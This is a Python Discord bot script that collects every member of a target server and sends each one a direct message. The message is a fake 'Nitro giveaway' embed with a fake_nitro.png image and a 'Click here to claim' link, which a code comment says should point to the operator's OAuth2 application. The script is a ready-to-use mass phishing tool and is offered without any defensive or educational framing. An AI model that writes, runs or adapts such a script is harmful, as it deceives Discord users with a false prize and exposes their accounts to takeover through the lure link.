from contextlib import nullcontext
import time
import discord
import datetime
import requests
import argparse




serverId = '' # The server ID where you want to DM all members
bot_token = '' # Your bot token here



intents = discord.Intents.default()
intents.guilds = True  # Pour recevoir des événements liés aux serveurs (guilds)
intents.members = True  # Pour recevoir des événements liés aux membres
intents.message_content = True  # Pour recevoir des événements liés aux messages

client = discord.Client(intents=intents)

clientId = '' # Your client ID here
clientSecret = '' # Your client secret here
redirectUri = '' # Your redirect URI here


# Sending DMs to all members of a Discord server
@client.event
async def on_ready():
  parser = argparse.ArgumentParser(description='Program to send DMs to members of a Discord server.')
  parser.add_argument('--last_member_id', type=int, default=0, help='ID of the last member processed')
  args = parser.parse_args()

  def send_dms(last_member_id):
    if last_member_id == None:
        endpoint = 'https://discord.com/api/v10/guilds/' + serverId + '/members?limit=1000'
    
    else:
        endpoint = 'https://discord.com/api/v10/guilds/' + serverId + '/members?after=' + str(last_member_id) + '&limit=1000'


    headers = {
         
    'Authorization': f'Bot {bot_token}',
     }
     
    response = requests.get(endpoint, headers=headers)
    
    
    
    
     
    user_ids = []
    
    
            
    print(response.json())
    for user in response.json():
     user_ids.append(user['user']['id'])
     last_member_id = user['user']['id']
     
     if last_member_id == None:
         print('Finished.')
         return
     
     
         
     
         
    for id in user_ids:
        
        
              
              endpoint = 'https://discord.com/api/v9/users/@me/channels'
              
              headers = {
                  'Authorization': f'Bot {bot_token}',
              }
              
              payload = {
                  'recipient_id': id,
              }
              
              response = requests.post(endpoint, headers=headers, json=payload)
              
              
              if response.status_code != 200:
                  continue
              
              
              endpoint = 'https://discord.com/api/v9/channels/' + response.json()['id'] + '/messages'
              
              payload = {
                  'embed': {
              "title": "Congratulations !",
              # Set the description to the message you want to send, most likely the link to your oauth2 application
              "description": "Congratulations on winning the Discord Nitro giveaway! 🎉 Enjoy your Nitro perks and have a great time on Discord! 🎈🎊\n\n[Click here to claim !]()",
              "color": 13654271,
              "image": {
                  "url": "https://media.discordapp.net/attachments/1102706043290665020/1125347521015840818/fake_nitro.png"
              }
          }
      }
              
              headers = {
                  'Authorization': f'Bot {bot_token}',
              }
              
              response = requests.post(endpoint, headers=headers, json=payload)
              
              
              if response.status_code != 200:
                  continue
              
              time.sleep(0.8)
              print('Message sent to ' + id)
        
    print('Finished.')
    
    send_dms(last_member_id)
  
  send_dms(args.last_member_id)
        
    
client.run(bot_token)